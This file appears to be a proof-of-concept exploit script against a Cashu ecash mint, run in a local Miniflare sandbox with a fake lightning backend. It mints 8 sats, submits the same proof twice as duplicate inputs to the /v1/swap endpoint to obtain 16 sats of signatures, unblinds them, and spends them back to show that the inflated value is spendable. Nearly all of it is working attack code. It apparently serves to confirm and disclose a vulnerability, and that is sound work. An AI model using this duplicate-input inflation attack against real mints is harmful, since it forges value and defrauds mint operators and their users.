// S8 liquidation proof: amplify 8→16 via duplicate inputs, unblind, then
// spend the 16 amplified sats back through /v1/swap. 200 → fully liquid.
import { readdirSync, readFileSync, mkdtempSync, rmSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { tmpdir } from 'node:os';

const CF = '/root/src/cashu-cf';
const { Miniflare } = await import(CF + '/node_modules/miniflare/dist/src/index.js');
const { Wallet, Mint, blindMessage, unblindSignature, pointFromHex } = await import(CF + '/node_modules/@cashu/cashu-ts/lib/cashu-ts.es.js');
const { randomBytes, bytesToHex } = await import(CF + '/node_modules/@noble/hashes/utils.js');
const { secp256k1 } = await import(CF + '/node_modules/@noble/curves/secp256k1.js');

const BUILD = resolve(CF, '.tmp-wrangler-build');
const modules = { 'index.js': { type: 'esm', contents: readFileSync(join(BUILD, 'index.js'), 'utf8') } };
for (const f of readdirSync(BUILD)) {
  if (f.endsWith('.wasm')) modules[f] = { type: 'wasm', contents: new Uint8Array(readFileSync(join(BUILD, f))) };
}
const env = {};
for (const [k, v] of Object.entries({
  MINT_PRIVATE_KEY: '1'.repeat(64), MINT_UNIT: 'sat', LIGHTNING_BACKEND: 'fakewallet',
  KEYSETS: '{"sat":{"1":{"input_fee_ppk":0,"max_order":10}}}', WEBSOCKETS_ENABLED: 'false', MELT_SAGA_V2: 'true'
})) env[k] = { type: 'text', value: v };
for (const [b, c] of Object.entries({ MINT_DO: 'MintDO', MINT_COORDINATOR: 'MintCoordinatorDO', MELT_QUOTE: 'QuoteDO' })) {
  env[b] = { type: 'durable-object', worker: 'w1', exportName: c };
}
const persist = mkdtempSync(join(tmpdir(), 's8l-'));
const mf = new Miniflare({
  resourcePersistencePath: persist,
  workers: [{
    config: {
      type: 'worker', name: 'w1', compatibilityDate: '2024-10-21',
      manifest: { mainModule: 'index.js', modulesRoot: BUILD, modules }, env,
      exports: {
        MintDO: { type: 'durable-object', storage: 'sqlite' },
        MintCoordinatorDO: { type: 'durable-object', storage: 'sqlite' },
        QuoteDO: { type: 'durable-object', storage: 'sqlite' }
      }
    }
  }]
});
const jsonSafe = (v) => (v === undefined ? undefined : JSON.stringify(v, (_, x) => (typeof x === 'bigint' ? Number(x) : x)));
const raw = async (path, body) => {
  const r = await mf.dispatchFetch('https://mint.test' + path, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
  const t = await r.text();
  let j; try { j = JSON.parse(t); } catch { }
  return { status: r.status, body: j, text: t };
};
const pointToHex = (p) => bytesToHex(p.toRawBytes ? p.toRawBytes(true) : p.toBytes(true));

try {
  const cr = async ({ endpoint, method, requestBody }) => {
    const r = await mf.dispatchFetch(endpoint, { method: method ?? 'GET', headers: { 'Content-Type': 'application/json' }, body: jsonSafe(requestBody) });
    const t = await r.text();
    let j; try { j = t ? JSON.parse(t) : undefined; } catch { }
    if (!r.ok) throw new Error(String(j?.detail ?? j?.error ?? t));
    return j;
  };
  const w = new Wallet(new Mint('https://mint.test', { customRequest: cr }), { unit: 'sat' });
  await w.loadMint(true);
  const q = await w.createMintQuoteBolt11(8);
  let paid = q;
  const dl = Date.now() + 8000;
  while (paid.state !== 'PAID' && Date.now() < dl) {
    paid = { ...q, ...(await w.checkMintQuoteBolt11(q)) };
    await new Promise(r => setTimeout(r, 50));
  }
  const proofs = await w.mintProofsBolt11(8, paid);
  const p = proofs.map(x => ({ amount: Number(x.amount), secret: x.secret, C: x.C, id: String(x.id) }))[0];
  const keysetId = p.id;

  // ── step 1: amplify 8 → 16 (duplicate input) ──
  const secrets = ['ampsec-0-' + bytesToHex(randomBytes(8)), 'ampsec-1-' + bytesToHex(randomBytes(8))];
  const bms = secrets.map(s => blindMessage(new TextEncoder().encode(s)));
  const outs = bms.map(bm => ({ amount: 8, B_: pointToHex(bm.B_), id: keysetId }));
  const amp = await raw('/v1/swap', { inputs: [p, p], outputs: outs });
  const ampAmounts = (amp.body?.signatures ?? []).map(s => Number(s.amount));
  console.log('STEP1 AMPLIFY 8→:', amp.status, ampAmounts.join('+'), '=', ampAmounts.reduce((a, b) => a + b, 0));
  if (amp.status !== 200) process.exit(1);

  // ── step 2: unblind into real proofs ──
  const keysResp = await (await mf.dispatchFetch(`https://mint.test/v1/keys/${keysetId}`)).json();
  const pubKeys = keysResp.keysets?.[0]?.keys ?? keysResp.keys;
  const ampProofs = amp.body.signatures.map((sig, i) => {
    const A = pointFromHex(pubKeys[String(8)]);
    const C = unblindSignature(pointFromHex(sig.C_), bms[i].r, A);
    return { amount: 8, secret: secrets[i], C: pointToHex(C), id: keysetId };
  });

  // ── step 3: spend the amplified 16 back through the mint ──
  const spendOuts = [1, 2].map(i => ({ amount: 8, B_: bytesToHex(secp256k1.getPublicKey(randomBytes(32), true)), id: keysetId }));
  const spend = await raw('/v1/swap', { inputs: ampProofs, outputs: spendOuts });
  const spendAmounts = (spend.body?.signatures ?? []).map(s => Number(s.amount));
  console.log('STEP3 LIQUIDATE 16:', spend.status, spendAmounts.join('+'), '=', spendAmounts.reduce((a, b) => a + b, 0));
  console.log(spend.status === 200 ? 'VERDICT: amplified value is SPENDABLE (8 became 16 liquid)' : 'VERDICT: amplified proofs rejected: ' + spend.text.slice(0, 120));
} finally {
  await mf.dispose();
  rmSync(persist, { recursive: true, force: true });
}
